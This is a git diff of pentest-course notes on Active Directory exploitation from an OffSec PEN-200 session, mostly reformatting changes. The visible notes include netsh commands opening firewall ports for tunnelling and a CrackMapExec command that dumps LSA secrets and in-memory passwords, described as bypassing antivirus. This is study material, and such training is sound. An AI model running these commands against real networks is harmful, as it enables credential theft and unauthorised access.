@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-08-31-offsec-live-pen-200.h
 author: 100007
 ---
 
-# OffSec Live: PEN-200
-
-**author:** Nathan Acks  
-**date:** 2022-08-31
-
 # Active Directory Enumeration & Exploitation, Part 3
 
 To use SSH as a generic SOCKS5 proxy, just use remote port forwarding.
@@ -53,9 +48,9 @@ Punch a hole in the Windows Firewall for ports 80, 443, and 4444:
 
 ```
 netsh advfirewall firewall add action=allow name=tunnel_in `
- dir=in protocol=tcp localport="80,443,4444"
+      dir=in protocol=tcp localport="80,443,4444"
 netsh advfirewall firewall add action=allow name=tunnel_out `
- dir=out protocol=tcp localport="80,443,4444"
+      dir=out protocol=tcp localport="80,443,4444"
 ```
 
 Encode a command to base64 in PowerShell:
@@ -90,7 +85,7 @@ AV can also by bypassed using CrackMapExec:
 
 ```
 crackmapexec smb $TARGET_NETWORK/$TARGET_NETMASK \
--u $TARGER_USER -p $CRACKED_PASSWORD --lsa 2> /dev/null
+	-u $TARGER_USER -p $CRACKED_PASSWORD --lsa 2> /dev/null
 ```
 
 This only works if `$TARGET_USER` is an admin. If a user’s password is currently in memory, CrackMapExec will dump this as well (so then you don’t need to crack the hash!).
